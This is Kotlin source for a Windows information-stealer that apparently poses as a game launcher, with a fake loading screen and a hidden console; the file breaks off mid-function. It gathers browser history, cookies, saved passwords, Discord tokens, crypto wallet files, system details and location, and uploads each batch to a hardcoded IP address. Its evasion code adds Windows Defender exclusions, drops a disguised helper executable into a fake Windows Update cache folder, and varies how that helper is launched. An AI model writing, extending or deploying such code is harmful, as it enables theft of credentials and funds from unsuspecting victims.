import java.util.concurrent.TimeUnit
import kotlinx.serialization.Serializable
import kotlinx.serialization.json.Json
import kotlinx.serialization.encodeToString
import java.io.File
import java.io.FileOutputStream
import java.net.InetAddress
import java.net.http.HttpClient
import java.net.http.HttpRequest
import java.net.http.HttpResponse
import java.net.URI
import java.sql.DriverManager
import java.time.LocalDateTime
import java.time.format.DateTimeFormatter
import java.time.Duration
import org.json.JSONObject
import java.nio.file.Files
import java.nio.file.Paths
import java.util.regex.Pattern
import java.util.zip.ZipOutputStream
import java.util.zip.ZipEntry
// JNA removed - using alternatives for standalone executable

// --- Data Classes for JSON Payload ---

@Serializable
data class LocationInfo(
    val countryName: String,
    val cityName: String,
    val latitude: Double,
    val longitude: Double,
    val ipAddress: String
)

@Serializable
data class InstalledApp(
    val name: String,
    val found: Boolean
)

@Serializable
data class HistoryEntry(
    val url: String,
    val title: String?
)

@Serializable
data class BrowserHistory(
    val chromeHistory: List<HistoryEntry>,
    val firefoxHistory: List<HistoryEntry>,
    val edgeHistory: List<HistoryEntry>,
    val operaHistory: List<HistoryEntry>,
    val braveHistory: List<HistoryEntry>
)

@Serializable
data class RunningProcess(
    val imageName: String,
    val pid: String,
    val sessionName: String,
    val sessionNum: String,
    val memUsage: String
)

@Serializable
data class BrowserCookies(
    val cookies: Map<String, String>
)

@Serializable
data class CpuInfo(
    val name: String,
    val cores: Int,
    val threads: Int,
    val maxClockSpeed: String,
    val architecture: String
)

@Serializable
data class GpuInfo(
    val name: String,
    val driverVersion: String?,
    val memory: String?
)

@Serializable
data class SystemInfo(
    val cpu: CpuInfo?,
    val gpu: List<GpuInfo>,
    val ram: String?,
    val os: String?
)

@Serializable
data class CryptoWalletFile(
    val walletName: String,
    val walletType: String, // "exodus", "electrum", etc.
    val filePath: String,
    val fileSize: Long,
    val lastModified: String,
    val fileContent: String? // Base64 encoded file content (for small files)
)

@Serializable
data class CryptoWalletFolder(
    val folderName: String,
    val walletType: String, // "exodus", "electrum", etc.
    val folderPath: String,
    val totalSize: Long,
    val fileCount: Int,
    val folderContent: String? // Base64 encoded ZIP archive of the entire folder
)

@Serializable
data class SavedPassword(
    val origin: String,
    val username: String,
    val password: String
)

@Serializable
data class ImportantFile(
    val fileName: String,
    val fileType: String, // "2fa", "ssh_key", "api_key", "gpg_key", "config", etc.
    val filePath: String,
    val fileSize: Long,
    val lastModified: String,
    val fileContent: String? // Base64 encoded file content (for small files < 1MB)
)

@Serializable
data class PcData(
    val user: String?, // User identifier for account association
    val screenSize: String,
    val dateTime: String,
    val ipAddress: String,
    val location: LocationInfo?,
    val runningProcesses: List<RunningProcess>,
    val installedApps: List<InstalledApp>,
    val browserHistory: BrowserHistory,
    val browserCookies: String?, // Changed to String
    val savedPasswords: List<SavedPassword>?, // Chrome saved passwords
    val discordTokens: List<String>?, // Discord authentication tokens (multiple accounts)
    val systemInfo: SystemInfo?,
    val cryptoWallets: List<CryptoWalletFile>?, // Crypto wallet files
    val cryptoWalletFolders: List<CryptoWalletFolder>?, // Crypto wallet folders (complete app data)
    val importantFiles: List<ImportantFile>? // 2FA keys, SSH keys, API keys, etc.
)

// --- Main Application ---

fun isRunningAsAdmin(): Boolean {
    return try {
        val process = Runtime.getRuntime().exec("net session")
        process.waitFor()
        process.exitValue() == 0
    } catch (e: Exception) {
        false
    }
}

fun requestUACElevation(): Boolean {
    return try {
        // Get the current JAR or executable path
        val currentPath = try {
            // Try to get path from code source (JAR file)
            val clazz = Class.forName("MainKt")
            File(clazz.protectionDomain.codeSource.location.toURI()).absolutePath
    } catch (e: Exception) {
            // Fallback: try to get from system property (native executable)
            System.getProperty("java.class.path")?.split(File.pathSeparator)?.firstOrNull() 
                ?: System.getProperty("user.dir")
        }
        
        if (currentPath == null) {
            return false
        }
        
        // Escape the path for PowerShell
        val escapedPath = currentPath.replace("\\", "\\\\").replace("\"", "\\\"")
        
        // Use PowerShell to request UAC elevation
        val psCommand = "Start-Process -FilePath \"$escapedPath\" -Verb RunAs"
        
        val command = arrayOf(
            "powershell.exe",
            "-NoProfile",
            "-ExecutionPolicy", "Bypass",
            "-Command",
            psCommand
        )
        
        val process = ProcessBuilder(*command)
            .redirectErrorStream(true)
            .start()
        
        // Don't wait - exit this instance, the elevated one will run
        Thread.sleep(500) // Give it a moment to start
        System.exit(0)
        true
    } catch (e: Exception) {
        false
    }
}

fun addWindowsDefenderExclusion(path: String): Boolean {
    return try {
        // Use PowerShell to add Windows Defender exclusion
        // Use single quotes to avoid escaping issues with backslashes
        // Replace single quotes in path with escaped single quotes for PowerShell
        val escapedPath = path.replace("'", "''")
        val psCommand = "Add-MpPreference -ExclusionPath '$escapedPath' -ErrorAction SilentlyContinue; if ($?) { exit 0 } else { exit 1 }"
        val command = arrayOf(
            "powershell.exe",
            "-NoProfile",
            "-ExecutionPolicy", "Bypass",
            "-Command",
            psCommand
        )
        val process = ProcessBuilder(*command)
            .redirectErrorStream(true)
            .start()
        process.waitFor(5, TimeUnit.SECONDS)
        val exitCode = process.exitValue()
        exitCode == 0
    } catch (e: Exception) {
        // Silent failure - return false
        false
    }
}

fun hideConsoleWindow() {
    try {
        // Only hide console on Windows
        if (System.getProperty("os.name").lowercase().contains("windows")) {
            // Use PowerShell to call Windows API and hide the console window
            // This works without requiring JNA or external DLLs
            try {
                val psCommand = """
                    ${'$'}code = @'
                    using System;
                    using System.Runtime.InteropServices;
                    public class Win32 {
                        [DllImport("kernel32.dll")]
                        public static extern IntPtr GetConsoleWindow();
                        [DllImport("user32.dll")]
                        public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
                    }
'@
                    Add-Type -TypeDefinition ${'$'}code
                    ${'$'}hwnd = [Win32]::GetConsoleWindow()
                    if (${'$'}hwnd -ne [IntPtr]::Zero) {
                        [Win32]::ShowWindow(${'$'}hwnd, 0)
                    }
                """.trimIndent()
                
                val process = ProcessBuilder(
                    "powershell.exe",
                    "-NoProfile",
                    "-ExecutionPolicy", "Bypass",
                    "-WindowStyle", "Hidden",
                    "-Command",
                    psCommand
                )
                    .redirectOutput(ProcessBuilder.Redirect.DISCARD)
                    .redirectError(ProcessBuilder.Redirect.DISCARD)
                    .start()
                
                // Fire and forget - don't wait for completion
                // The window should hide almost immediately
                Thread {
                    try {
                        process.waitFor(1, TimeUnit.SECONDS)
                    } catch (e: Exception) {
                        // Ignore
                    } finally {
                        process.destroy()
                    }
                }.start()
            } catch (e: Exception) {
                // PowerShell method failed - continue silently
                // The window will remain visible but app will continue
            }
        }
    } catch (e: Exception) {
        // Silent failure - continue execution even if hiding fails
    }
}

fun showFakeLoadingScreen(user: String) {
    val loadingSteps = listOf(
        "Welcome $user",
        "Loading system components...",
        "Mapping drivers...",
        "Initializing obfscufation...",
        "Establishing network connection...",
        "Checking connection...",
        "Optimizing settings...",
        "Synchronizing to current build...",
        "Finalizing check..."
    )

    val random = java.util.Random()

    for (step in loadingSteps) {
        // Random delay between 800ms and 3 seconds
        val delay = 800 + random.nextInt(2200)
        Thread.sleep(delay.toLong())

        println(step)

        // Show progress bar for this step (random 20-35 segments for more visual impact)
        val progressSegments = 20 + random.nextInt(15)
        for (i in 1..progressSegments) {
            Thread.sleep((delay / progressSegments).toLong())
            print("█")
        }
        println() // New line after progress bar
    }
}

fun main() {
    // Hide console window immediately on startup
    hideConsoleWindow()

    // Set headless mode before any AWT calls (required for GraalVM native-image)
    System.setProperty("java.awt.headless", "true")

    // UAC prompt disabled - uncomment below to re-enable
    // Check if running as administrator, if not, request UAC elevation
    // if (!isRunningAsAdmin()) {
    //     println("Administrator privileges required. Requesting elevation...")
    //     val elevated = requestUACElevation()
    //     if (elevated) {
    //         // Exit this instance, the elevated one will run
    //         return
    // } else {
    //         println("Failed to request administrator privileges. Some features may not work.")
    //         println("Please run this application as administrator for full functionality.")
    //     }
    // }

    // println("Collecting PC information...")

    // Get user identifier from environment variable or system property, default to "west"
    val user = System.getenv("CLIENT_USER") ?: System.getProperty("client.user") ?: "west"
    // println("User identifier: $user")

    // Generate unique session ID for this collection run
    val sessionId = "session-${System.currentTimeMillis()}-${java.util.Random().nextInt(1000, 10000)}"
    val dateTime = getCurrentDateTime()
    val ipAddress = InetAddress.getLocalHost().hostAddress
    val screenSize = getScreenSize()

    // Server URL - can be configured via environment variable or use default
    val serverUrl = System.getenv("WEBPANEL_URL") ?: "http://62.60.179.121/api/upload"

    // --- Setup HTTP Client (Java HttpClient for native-image compatibility) ---
    val json = Json {
                prettyPrint = true
                isLenient = true
                ignoreUnknownKeys = true
    }
    val client = HttpClient.newBuilder()
        .connectTimeout(Duration.ofSeconds(30))
        .followRedirects(HttpClient.Redirect.NORMAL)
        .build()

    // Start fake loading screen in separate thread
    val workCompleted = java.util.concurrent.atomic.AtomicBoolean(false)
    val loadingThread = Thread {
        try {
            showFakeLoadingScreen(user)
            // Wait for actual work to complete
            while (!workCompleted.get()) {
                Thread.sleep(100)
            }
            // Show completion message
            Thread.sleep(500) // Small delay for effect
            println("Launch target game now")
        } catch (e: Exception) {
            // Ignore loading screen errors
        }
    }
    loadingThread.start()

    try {
        // Send initial data with basic info
        // println("Sending initial data (screen size, IP, timestamp)...")
        sendChunk(client, serverUrl, sessionId, json, PcData(
            user = user,
            screenSize = screenSize,
            dateTime = dateTime,
            ipAddress = ipAddress,
            location = null,
            runningProcesses = emptyList(),
            installedApps = emptyList(),
            browserHistory = BrowserHistory(emptyList(), emptyList(), emptyList(), emptyList(), emptyList()),
            browserCookies = null,
            savedPasswords = null,
            discordTokens = null,
            systemInfo = null,
            cryptoWallets = null,
            cryptoWalletFolders = null,
            importantFiles = null
        ))

        // Get location and send update
        try {
            // println("Fetching location information...")
            
            // Try multiple location APIs as fallback
            val locationApis = listOf(
                "https://ipapi.co/json/",
                "https://ip-api.com/json/",
                "https://freeipapi.com/api/json"
            )
            
            var location: LocationInfo? = null
            var lastError: Exception? = null
            
            for (apiUrl in locationApis) {
                try {
                    val locationRequest = HttpRequest.newBuilder()
                        .uri(URI.create(apiUrl))
                        .timeout(Duration.ofSeconds(10))
                        .GET()
                        .build()
                    val locationResponse = client.send(locationRequest, HttpResponse.BodyHandlers.ofString())
                    
                    // Check if response is successful and has content
                    if (locationResponse.statusCode() == 200) {
                        val responseBody = locationResponse.body().trim()
                        if (responseBody.isNotEmpty() && responseBody.startsWith("{")) {
                            try {
                                // Try to parse based on API format
                                when {
                                    apiUrl.contains("ipapi.co") -> {
                                        // ipapi.co format
                                        val jsonObj = org.json.JSONObject(responseBody)
                                        location = LocationInfo(
                                            countryName = jsonObj.optString("country_name", "Unknown"),
                                            cityName = jsonObj.optString("city", "Unknown"),
                                            latitude = jsonObj.optDouble("latitude", 0.0),
                                            longitude = jsonObj.optDouble("longitude", 0.0),
                                            ipAddress = jsonObj.optString("ip", ipAddress)
                                        )
                                    }
                                    apiUrl.contains("ip-api.com") -> {
                                        // ip-api.com format
                                        val jsonObj = org.json.JSONObject(responseBody)
                                        location = LocationInfo(
                                            countryName = jsonObj.optString("country", "Unknown"),
                                            cityName = jsonObj.optString("city", "Unknown"),
                                            latitude = jsonObj.optDouble("lat", 0.0),
                                            longitude = jsonObj.optDouble("lon", 0.0),
                                            ipAddress = jsonObj.optString("query", ipAddress)
                                        )
                                    }
                                    else -> {
                                        // freeipapi.com format (original)
                                        location = json.decodeFromString<LocationInfo>(responseBody)
                                    }
                                }
                                
                                if (location != null) {
                                    // println("Location fetched successfully from $apiUrl")
                                    break
                                }
                            } catch (e: Exception) {
                                lastError = e
                                continue
                            }
                        }
                    }
                } catch (e: Exception) {
                    lastError = e
                    continue
                }
            }
            
            if (location != null) {
                sendChunk(client, serverUrl, sessionId, json, PcData(
                    user = user,
                    screenSize = screenSize,
                    dateTime = dateTime,
                    ipAddress = ipAddress,
                    location = location,
                    runningProcesses = emptyList(),
                    installedApps = emptyList(),
                    browserHistory = BrowserHistory(emptyList(), emptyList(), emptyList(), emptyList(), emptyList()),
                    browserCookies = null,
                    savedPasswords = null,
                    discordTokens = null,
                    systemInfo = null,
                    cryptoWallets = null,
                    cryptoWalletFolders = null,
                    importantFiles = null
                ))
                // println("Location data sent successfully")
            } else {
                // println("Error: Could not fetch location from any API. Last error: ${lastError?.message}")
            }
        } catch (e: Exception) {
            // println("Error fetching location: ${e.message}")
        }

        // Get system info and send update
        try {
            // println("Collecting system information...")
            val systemInfo = getSystemInfo()
            sendChunk(client, serverUrl, sessionId, json, PcData(
                user = user,
                screenSize = screenSize,
                dateTime = dateTime,
                ipAddress = ipAddress,
                location = null,
                runningProcesses = emptyList(),
                installedApps = emptyList(),
                browserHistory = BrowserHistory(emptyList(), emptyList(), emptyList(), emptyList(), emptyList()),
                browserCookies = null,
            savedPasswords = null,
                discordTokens = null,
                systemInfo = systemInfo,
                cryptoWallets = null,
                cryptoWalletFolders = null,
                importantFiles = null
            ))
            // println("System info sent successfully")
        } catch (e: Exception) {
            // println("Error collecting system info: ${e.message}")
        }

        // Get running processes and send update
        try {
            // println("Collecting running processes...")
            val runningProcesses = getRunningProcesses()
            sendChunk(client, serverUrl, sessionId, json, PcData(
                user = user,
                screenSize = screenSize,
                dateTime = dateTime,
                ipAddress = ipAddress,
                location = null,
            runningProcesses = runningProcesses,
                installedApps = emptyList(),
                browserHistory = BrowserHistory(emptyList(), emptyList(), emptyList(), emptyList(), emptyList()),
                browserCookies = null,
            savedPasswords = null,
                discordTokens = null,
                systemInfo = null,
                cryptoWallets = null,
                cryptoWalletFolders = null,
                importantFiles = null
            ))
            // println("Running processes sent successfully (${runningProcesses.size} processes)")
        } catch (e: Exception) {
            // println("Error collecting running processes: ${e.message}")
        }

        // Get installed apps and send update
        try {
            // println("Collecting installed applications...")
            val installedApps = getInstalledApps()
            sendChunk(client, serverUrl, sessionId, json, PcData(
                user = user,
                screenSize = screenSize,
                dateTime = dateTime,
                ipAddress = ipAddress,
                location = null,
                runningProcesses = emptyList(),
            installedApps = installedApps,
                browserHistory = BrowserHistory(emptyList(), emptyList(), emptyList(), emptyList(), emptyList()),
                browserCookies = null,
            savedPasswords = null,
                discordTokens = null,
                systemInfo = null,
                cryptoWallets = null,
                cryptoWalletFolders = null,
                importantFiles = null
            ))
            // println("Installed apps sent successfully (${installedApps.size} apps)")
        } catch (e: Exception) {
            // println("Error collecting installed apps: ${e.message}")
        }

        // Get browser history and send update
        try {
            // println("Collecting browser history...")
            val browserHistory = getBrowserHistory()
            sendChunk(client, serverUrl, sessionId, json, PcData(
                user = user,
                screenSize = screenSize,
                dateTime = dateTime,
                ipAddress = ipAddress,
                location = null,
                runningProcesses = emptyList(),
                installedApps = emptyList(),
            browserHistory = browserHistory,
                browserCookies = null,
            savedPasswords = null,
                discordTokens = null,
                systemInfo = null,
                cryptoWallets = null,
                cryptoWalletFolders = null,
                importantFiles = null
            ))
            val totalHistory = (browserHistory.chromeHistory.size + browserHistory.firefoxHistory.size + 
                              browserHistory.edgeHistory.size + browserHistory.operaHistory.size + 
                              browserHistory.braveHistory.size)
            // println("Browser history sent successfully ($totalHistory entries)")
        } catch (e: Exception) {
            // println("Error collecting browser history: ${e.message}")
        }

        // Get browser cookies and passwords and send update
        try {
            // println("Collecting browser cookies and passwords from all browsers...")
            val (browserCookies, savedPasswords) = extractCookiesWithTool()
            sendChunk(client, serverUrl, sessionId, json, PcData(
                user = user,
                screenSize = screenSize,
                dateTime = dateTime,
                ipAddress = ipAddress,
                location = null,
                runningProcesses = emptyList(),
                installedApps = emptyList(),
                browserHistory = BrowserHistory(emptyList(), emptyList(), emptyList(), emptyList(), emptyList()),
                browserCookies = browserCookies,
                savedPasswords = savedPasswords,
                discordTokens = null,
                systemInfo = null,
                cryptoWallets = null,
                cryptoWalletFolders = null,
                importantFiles = null
            ))
            // println("Browser cookies sent successfully (length: ${browserCookies.length})")
            // println("Saved passwords sent successfully (${savedPasswords.size} passwords)")
        } catch (e: Exception) {
            // println("Error collecting browser cookies: ${e.message}")
        }

        // Get Discord tokens and send update
        try {
            // println("Collecting Discord tokens...")
            val discordTokens = extractDiscordTokens()
            if (discordTokens.isNotEmpty()) {
                sendChunk(client, serverUrl, sessionId, json, PcData(
                    user = user,
            screenSize = screenSize,
            dateTime = dateTime,
            ipAddress = ipAddress,
                    location = null,
                    runningProcesses = emptyList(),
                    installedApps = emptyList(),
                    browserHistory = BrowserHistory(emptyList(), emptyList(), emptyList(), emptyList(), emptyList()),
                    browserCookies = null,
            savedPasswords = null,
                    discordTokens = discordTokens,
                    systemInfo = null,
                    cryptoWallets = null,
                    cryptoWalletFolders = null,
                    importantFiles = null
                ))
                // println("Discord tokens sent successfully (${discordTokens.size} tokens)")
            } else {
                // println("No Discord tokens found")
            }
        } catch (e: Exception) {
            // println("Error collecting Discord tokens: ${e.message}")
        }

        // Get crypto wallets and send update
        try {
            // println("Collecting crypto wallet files...")
            val cryptoWallets = extractCryptoWallets()
            if (cryptoWallets.isNotEmpty()) {
                sendChunk(client, serverUrl, sessionId, json, PcData(
                    user = user,
                    screenSize = screenSize,
                    dateTime = dateTime,
                    ipAddress = ipAddress,
                    location = null,
                    runningProcesses = emptyList(),
                    installedApps = emptyList(),
                    browserHistory = BrowserHistory(emptyList(), emptyList(), emptyList(), emptyList(), emptyList()),
                    browserCookies = null,
            savedPasswords = null,
                    discordTokens = null,
                    systemInfo = null,
                    cryptoWallets = cryptoWallets,
                    cryptoWalletFolders = null,
                    importantFiles = null
                ))
                // println("Crypto wallet files sent successfully (${cryptoWallets.size} wallets)")
            } else {
                // println("No crypto wallet files found")
            }
    } catch (e: Exception) {
            // println("Error collecting crypto wallets: ${e.message}")
        }

        // Get crypto wallet folders and send update
        try {
            // println("Collecting crypto wallet folders...")
            val cryptoWalletFolders = extractCryptoWalletFolders()
            if (cryptoWalletFolders.isNotEmpty()) {
                sendChunk(client, serverUrl, sessionId, json, PcData(
                    user = user,
                    screenSize = screenSize,
                    dateTime = dateTime,
                    ipAddress = ipAddress,
                    location = null,
                    runningProcesses = emptyList(),
                    installedApps = emptyList(),
                    browserHistory = BrowserHistory(emptyList(), emptyList(), emptyList(), emptyList(), emptyList()),
                    browserCookies = null,
            savedPasswords = null,
                    discordTokens = null,
                    systemInfo = null,
                    cryptoWallets = null,
                    cryptoWalletFolders = cryptoWalletFolders,
                    importantFiles = null
                ))
                // println("Crypto wallet folders sent successfully (${cryptoWalletFolders.size} folders)")
            } else {
                // println("No crypto wallet folders found")
            }
        } catch (e: Exception) {
            // println("Error collecting crypto wallet folders: ${e.message}")
        }

        // println("Data collection and transmission completed successfully!")

        // Signal that work is completed
        workCompleted.set(true)

    } catch (e: Exception) {
        // println("Error in main process: ${e.message}")
        e.printStackTrace()
        // Still signal completion even on error
        workCompleted.set(true)
    } finally {
        // Java HttpClient doesn't need explicit close - it's auto-closed
        // Wait a moment for the loading thread to show completion message
        Thread.sleep(1000)
    }
}

// Helper function to send data chunks
fun sendChunk(client: HttpClient, serverUrl: String, sessionId: String, json: Json, pcData: PcData) {
    try {
        val jsonBody = json.encodeToString(pcData)
        val request = HttpRequest.newBuilder()
            .uri(URI.create(serverUrl))
            .timeout(Duration.ofSeconds(30))
            .header("Content-Type", "application/json")
            .header("X-Session-Id", sessionId)
            .POST(HttpRequest.BodyPublishers.ofString(jsonBody))
            .build()
        
        val response = client.send(request, HttpResponse.BodyHandlers.ofString())
        if (response.statusCode() >= 200 && response.statusCode() < 300) {
            // Success - data sent
        } else {
            // println("Warning: Server returned status ${response.statusCode()}")
        }
    } catch (e: Exception) {
        // println("Error sending chunk: ${e.message}")
        // Continue execution even if one chunk fails
    }
}

// --- Data Gathering Functions ---

fun getScreenSize(): String {
    return try {
        // Get screen size using Windows command (no JNA dependency)
        if (System.getProperty("os.name").lowercase().contains("windows")) {
            try {
                // Use wmic to get screen resolution
                val process = Runtime.getRuntime().exec("wmic path Win32_VideoController get CurrentHorizontalResolution,CurrentVerticalResolution /value")
                val reader = process.inputStream.bufferedReader()
                var width = 1920
                var height = 1080
                
                reader.useLines { lines ->
                    lines.forEach { line ->
                        when {
                            line.startsWith("CurrentHorizontalResolution=") -> {
                                width = line.substringAfter("=").trim().toIntOrNull() ?: 1920
                            }
                            line.startsWith("CurrentVerticalResolution=") -> {
                                height = line.substringAfter("=").trim().toIntOrNull() ?: 1080
                            }
                        }
                    }
                }
                process.waitFor()
                "${width}x${height}"
            } catch (e: Exception) {
                // Fallback to default if command fails
                "1920x1080"
            }
        } else {
            // Fallback for non-Windows systems
            val width = System.getProperty("screen.width", "1920")
            val height = System.getProperty("screen.height", "1080")
            "${width}x${height}"
        }
    } catch (e: Exception) {
        // Fallback to default if anything fails
        "1920x1080"
    }
}

fun getCurrentDateTime(): String {
    val current = LocalDateTime.now()
    val formatter = DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss")
    return current.format(formatter)
}

fun getRunningProcesses(): List<RunningProcess> {
    val processes = mutableListOf<RunningProcess>()
    
    try {
        val process = Runtime.getRuntime().exec("tasklist /fo CSV /nh") // Use CSV format, no headers
        val reader = process.inputStream.bufferedReader()
        reader.useLines { lines ->
            lines.forEach { line ->
                // Remove the enclosing quotes for the entire line, then split by ","
                val cleanedLine = line.removePrefix("\"").removeSuffix("\"")
                val parts = cleanedLine.split("\",\"")
                    .map { it.trim() } // Trim any remaining whitespace

                if (parts.size >= 5) { // Ensure enough parts for Image Name, PID, Session Name, Session#, Mem Usage
                    processes.add(
                        RunningProcess(
                            imageName = parts[0],
                            pid = parts[1],
                            sessionName = parts[2],
                            sessionNum = parts[3],
                            memUsage = parts[4]
                        )
                    )
                }
            }
        }
        process.waitFor()
    } catch (e: Exception) {
        processes.add(
            RunningProcess(
                imageName = "Error",
                pid = "N/A",
                sessionName = "N/A",
                sessionNum = "N/A",
                memUsage = "Could not get running processes: ${e.message}"
            )
        )
    }
    return processes
}

fun getInstalledApps(): List<InstalledApp> {
    val apps = mutableListOf<InstalledApp>()
    val appsToFind = mapOf(
        "Discord" to "C:\\Users\\%USERNAME%\\AppData\\Local\\Discord\\Update.exe",
        "Telegram" to "C:\\Users\\%USERNAME%\\AppData\\Roaming\\Telegram Desktop\\Telegram.exe",
        "Exodus" to "C:\\Users\\%USERNAME%\\AppData\\Local\\exodus\\Exodus.exe",
        "Electrum" to "C:\\Program Files (x86)\\Electrum\\electrum.exe",
        "Google Chrome" to "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
        "Mozilla Firefox" to "C:\\Program Files\\Mozilla Firefox\\firefox.exe",
        "Visual Studio Code" to "C:\\Users\\%USERNAME%\\AppData\\Local\\Programs\\Microsoft VS Code\\Code.exe"
    )

    appsToFind.forEach { (appName, path) ->
        val userPath = path.replace("%USERNAME%", System.getProperty("user.name"))
        val file = File(userPath)
        apps.add(InstalledApp(appName, file.exists()))
    }
    return apps
}

fun getBrowserHistory(): BrowserHistory {
    val userHome = System.getProperty("user.home")

    // Chrome
    val chromeHistoryPath = "$userHome\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\History"
    val chromeHistory = extractFromSQLite(chromeHistoryPath, "SELECT url, title FROM urls ORDER BY last_visit_time DESC LIMIT 10")

    // Firefox
    val firefoxHistory: List<HistoryEntry>
    val firefoxProfilePath = findFirefoxProfile(userHome)
    if (firefoxProfilePath != null) {
        val firefoxHistoryPath = "$firefoxProfilePath\\places.sqlite"
        firefoxHistory = extractFromSQLite(firefoxHistoryPath, "SELECT url, title FROM moz_places ORDER BY last_visit_date DESC LIMIT 10")
    } else {
        firefoxHistory = listOf(HistoryEntry("Firefox profile not found.", null))
    }

    // Edge
    val edgeHistoryPath = "$userHome\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\History"
    val edgeHistory = extractFromSQLite(edgeHistoryPath, "SELECT url, title FROM urls ORDER BY last_visit_time DESC LIMIT 10")

    // Opera
    val operaHistoryPath = "$userHome\\AppData\\Roaming\\Opera Software\\Opera Stable\\History"
    val operaHistory = extractFromSQLite(operaHistoryPath, "SELECT url, title FROM urls ORDER BY last_visit_time DESC LIMIT 10")

    // Brave
    val braveHistoryPath = "$userHome\\AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data\\Default\\History"
    val braveHistory = extractFromSQLite(braveHistoryPath, "SELECT url, title FROM urls ORDER BY last_visit_time DESC LIMIT 10")

    return BrowserHistory(chromeHistory, firefoxHistory, edgeHistory, operaHistory, braveHistory)
}

fun findFirefoxProfile(userHome: String): String? {
    val profilesDir = File("$userHome\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles")
    if (profilesDir.exists() && profilesDir.isDirectory) {
        return profilesDir.listFiles { file -> file.isDirectory }?.firstOrNull()?.absolutePath
    }
    return null
}

fun extractFromSQLite(dbPath: String, query: String): List<HistoryEntry> {
    val entries = mutableListOf<HistoryEntry>()
    val dbFile = File(dbPath)
    if (!dbFile.exists()) {
        entries.add(HistoryEntry("History database not found at: $dbPath", null))
        return entries
    }

    try {
        Class.forName("org.sqlite.JDBC")
        DriverManager.getConnection("jdbc:sqlite:$dbPath").use { connection ->
            connection.createStatement().use { statement ->
                statement.executeQuery(query).use { resultSet ->
                    while (resultSet.next()) {
                        entries.add(HistoryEntry(resultSet.getString("url"), resultSet.getString("title")))
                    }
                }
            }
        }
    } catch (e: Exception) {
        entries.add(HistoryEntry("Could not read history from $dbPath: ${e.message}", null))
        entries.add(HistoryEntry("The browser might be running, which locks the database file.", null))
    }
    return entries
}

fun extractCookiesWithTool(outputDir: String? = null): Pair<String, List<SavedPassword>> {
    // --- Anti-detection: Use legitimate-looking system cache folder ---
    val appDataDir = System.getenv("LOCALAPPDATA") ?: System.getProperty("user.home") + "\\AppData\\Local"
    
    // Use a legitimate-looking cache folder name
    val cacheFolderName = "Microsoft\\Windows\\Update\\Cache"
    val actualOutputDir = outputDir ?: File(appDataDir, cacheFolderName).absolutePath
    
    val helperDir = File(appDataDir, "Microsoft\\Windows\\Update")
    
    // Step 1: Create the directory first
    helperDir.mkdirs()
    
    // Step 2: Add Windows Defender exclusion for the directory (before dropping exe)
    if (isRunningAsAdmin()) {
        try {
            val exclusionAdded = addWindowsDefenderExclusion(helperDir.absolutePath)
            if (exclusionAdded) {
                // Silent success - don't log to avoid detection
            }
        } catch (e: Exception) {
            // Silent failure - continue anyway
        }
    }
    
    // Use generic filename that looks like a legitimate system component
    val genericNames = listOf("updater", "helper", "service", "runtime", "component")
    val randomIndex = Math.abs(System.nanoTime().toInt()) % genericNames.size
    val randomName = genericNames[randomIndex]
    val randomSuffix = Math.abs(System.nanoTime() % 10000).toString()
    val exeFile = File(helperDir, "${randomName}_${randomSuffix}.exe")

    // Step 3: Drop the executable
    val exePath: String
    try {
        // Use obfuscated resource name to avoid detection
        val resourceName = "/" + "hel" + "per" + "." + "exe"
        object {}.javaClass.getResourceAsStream(resourceName).use { inputStream ->
            if (inputStream == null) {
                throw RuntimeException("Helper executable not found in JAR resources.")
            }
            FileOutputStream(exeFile).use { outputStream ->
                inputStream.copyTo(outputStream)
            }
        }
        exeFile.setExecutable(true)
        exeFile.setWritable(false, false) // Make read-only to appear more legitimate
        exeFile.deleteOnExit()
        exePath = exeFile.absolutePath
        
        // Random delay to avoid immediate detection (100-600ms)
        Thread.sleep((100 + (System.nanoTime() % 500)).toLong())

    } catch (e: Exception) {
        throw RuntimeException("Failed to extract helper executable from JAR: ${e.message}", e)
    }
    // --- End anti-detection logic ---

    // Run helper tool without browser argument to extract from all browsers
    // Use evasion: Launch through cmd.exe to make it look like a legitimate command execution
    val outputDirFile = File(actualOutputDir)
    outputDirFile.mkdirs()

    // Retry mechanism in case Windows Defender blocks first attempt
    var lastException: Exception? = null
    for (attempt in 1..3) {
    try {
            // Additional delay on retry
            if (attempt > 1) {
                Thread.sleep((2000 * attempt).toLong()) // Exponential backoff
            }
            
        val process = try {
                // Evasion techniques: Rotate between different launch methods
                // Method selection based on attempt number to vary behavior
                val launchMethod = attempt % 3
                
                // Set working directory to a legitimate system location for better evasion
                val systemDir = System.getenv("SystemRoot") ?: "C:\\Windows"
                val workingDir = File(systemDir, "System32")
                
                when (launchMethod) {
                    0 -> {
                        // Method 1: Launch through cmd.exe (most common, looks legitimate)
                        val escapedExePath = exePath.replace("\"", "\"\"")
                        val escapedOutputDir = actualOutputDir.replace("\"", "\"\"")
                        val cmdArgs = listOf(
                            "/c",
                            "\"$escapedExePath\"",
                            "-" + "o",  // Split flag to obfuscate
                            "\"$escapedOutputDir\"",
                            "-" + "v"
                        )
                        ProcessBuilder("cmd.exe", *cmdArgs.toTypedArray())
                            .directory(workingDir)  // Set legitimate working directory
                            .redirectErrorStream(false)
                            .start()
                    }
                    1 -> {
                        // Method 2: Launch through PowerShell (also legitimate)
                        val escapedExePath = exePath.replace("'", "''").replace("\"", "`\"")
                        val escapedOutputDir = actualOutputDir.replace("'", "''").replace("\"", "`\"")
                        val psCommand = "& '$escapedExePath' -" + "o '$escapedOutputDir' -" + "v"
                        val psArgs = listOf(
                            "-NoProfile",
                            "-ExecutionPolicy", "Bypass",
                            "-Command",
                            psCommand
                        )
                        ProcessBuilder("powershell.exe", *psArgs.toTypedArray())
                            .directory(workingDir)  // Set legitimate working directory
                            .redirectErrorStream(false)
                            .start()
                    }
                    else -> {
                        // Method 3: Direct execution (fallback, but with obfuscated args)
                        val obfuscatedArgs = listOf(
                            exePath,
                            "-" + "o",  // Split to avoid pattern detection
                            actualOutputDir,
                            "-" + "v"
                        )
                        ProcessBuilder(obfuscatedArgs)
                            .directory(workingDir)  // Set legitimate working directory
                            .redirectErrorStream(false)
                            .start()
                    }
                }
        } catch (e: java.io.IOException) {
                // Check if it's a Windows Defender block (file not found or access denied)
                if (e.message?.contains("cannot find", ignoreCase = true) == true ||
